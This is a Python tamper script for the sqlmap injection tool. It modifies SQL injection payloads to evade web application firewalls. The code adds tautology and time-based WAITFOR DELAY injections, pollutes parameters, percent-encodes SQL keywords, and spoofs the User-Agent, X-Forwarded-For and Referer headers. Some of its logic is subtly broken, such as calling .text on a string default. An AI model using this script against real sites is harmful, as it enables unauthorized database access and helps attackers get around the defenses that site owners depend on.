from lib.core.enums import PRIORITY
from random import choice
import re

__priority__ = PRIORITY.HIGHEST

# Define a list of potential User-Agent strings for WAF evasion
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36"
]

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Refines the payload dynamically to bypass advanced filters and security mechanisms such as WAFs.
    Features include:
    - Simplified payload testing
    - Dynamic response refinement
    - Parameter pollution
    - Obfuscated SQL keywords
    - Time-based injection testing
    - Custom payload logging
    - WAF bypass with header manipulation
    """
    if not payload:
        return payload

    original_payload = payload

    # 1. Simplify payload for initial testing
    if "AND" in payload.upper():
        payload = payload.replace("AND", "' AND '1'='1")

    # 2. Add redundant parameters for parameter pollution testing
    redundant_params = "&t1=1 AND 1=1--&t2=1"
    payload += redundant_params

    # 3. Introduce time-based injection payload
    if "WAITFOR DELAY" not in payload.upper():
        payload += " WAITFOR DELAY '00:00:05';--"

    # 4. Obfuscate SQL keywords to bypass basic filters
    obfuscations = {
        "SELECT": "S%45LECT",
        "FROM": "F%52OM",
        "WHERE": "W%48ERE",
        "EXEC": "E%58EC",
        "INSERT": "I%4E%53ERT",
        "UPDATE": "U%50DATE",
        "DELETE": "D%45LETE"
    }
    for keyword, obfuscated in obfuscations.items():
        payload = re.sub(rf"\b{keyword}\b", obfuscated, payload, flags=re.IGNORECASE)

    # 5. Dynamic Response-Based Refinement (placeholder for future integration)
    # Example: Analyze responses to adjust payloads dynamically.
    # For now, we log the payload to allow manual refinement.
    response = kwargs.get("response", "")
    if response:
        if "error" in response.text.lower() or "syntax" in response.text.lower():
            print("[DEBUG] Possible SQL error detected. Payload may need further refinement.")

    # 6. Header Manipulation for WAF Evasion
    if kwargs.get("headers"):
        headers = kwargs["headers"]
        headers["User-Agent"] = choice(USER_AGENTS)  # Randomize User-Agent
        headers["X-Forwarded-For"] = "127.0.0.1"  # Spoof IP
        headers["Referer"] = "https://trusted-site.com"  # Fake Referer header
        kwargs["headers"] = headers

    # 7. Log payload and server responses for debugging
    print(f"[DEBUG] Original payload: {original_payload}")
    print(f"[DEBUG] Tampered payload: {payload}")
    if "response" in kwargs:
        print(f"[DEBUG] Server response: {kwargs['response'].text}")

    return payload
